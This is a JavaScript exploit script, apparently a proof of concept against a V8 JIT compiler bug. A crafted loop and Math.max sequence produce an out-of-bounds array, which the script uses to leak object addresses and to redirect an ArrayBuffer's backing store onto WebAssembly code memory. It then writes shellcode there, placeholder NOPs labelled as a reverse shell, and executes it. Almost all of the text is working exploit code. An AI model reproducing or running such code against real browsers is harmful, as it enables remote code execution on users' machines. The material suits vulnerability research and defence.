var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
let wasmFunc = wasmInstance.exports.main;

function hex(i){
  return i.toString(16).padStart(16, "0");
}

var buf = new ArrayBuffer(16);
var float_buf = new Float64Array(buf);
var int64_buf = new BigUint64Array(buf);

function f2i(float_data){
  float_buf[0] = float_data;
  return int64_buf[0];
}

function i2f(int_data){
  int64_buf[0] = int_data;
  return float_buf[0];
}

function print_float(log_, data){
  console.log(log_, hex(f2i(data)));
}

function gc(){
  for(let i=0; i<0x10000; i++){
    new String;
  }
}

gc();gc();

// -----------------------------------

function trigger() {
  var x = -Infinity;
  var k = 0;
  for (var i = 0; i < 1; i += x) {
      if (i == -Infinity) {
        x = +Infinity;
      }

      if (++k > 10) {
        break;
      }
  }

  var value = Math.max(i, 1024);
  value = -value;
  value = Math.max(value, -1025);
  value = -value;
  value -= 1022;
  value >>= 1; // *** 3 ***
  value += 10; //
  var array = Array(value);
  array[0] = 1.1;
  
  var trigger_float = [1.1, 1.2, 1.3];
  var trigger_obj = [{}, {}, {}];
  return [array, {}, trigger_float, trigger_obj];
};

for (let i = 0; i < 40000; ++i) {
  trigger();
}

var data_buf = new ArrayBuffer(0x1000);
var data_view = new DataView(data_buf);

var tmp = trigger();
var oob_arr = tmp[0];
var float_arr = tmp[2];
var obj_arr = tmp[3];

//%DebugPrint(data_buf);
//%DebugPrint(oob_arr);
//%DebugPrint(float_arr);
//%DebugPrint(obj_arr);

//oob_arr[12] == float_arr->elements->length?;
//oob_arr[13] == float_arr[0];
//oob_arr[18] == float_arr->elements_ptr
//oob_arr[43] == obj_arr[0];

// leak instance 
obj_arr[0] = wasmInstance;
var instance_addr = f2i(oob_arr[43]);
console.log("[+] leak wasm instance: ", hex(instance_addr));

// leak wasm addr
oob_arr[18] = i2f(instance_addr+0x80n-0x10n);
var wasm_addr = f2i(float_arr[0]);
console.log("[+] leak wasm addr: ", hex(wasm_addr));

// leak databuf addr
obj_arr[0] = data_buf;
var databuf_addr = f2i(oob_arr[43]);
console.log("[+] leak databuf: ", hex(databuf_addr));

// change backing_store
oob_arr[18] = i2f(databuf_addr+0x20n-0x10n);
float_arr[0] = i2f(wasm_addr); // backing_store

// trigger shellcode 
let shellcode = [
    0x9090909090909090n,
    0x0n,
];

for (var i = 0; i < shellcode.length; i++){
    data_view.setBigUint64(8*i, shellcode[i], true);
}

console.log("[+] trigger reverse shell!");
wasmFunc();


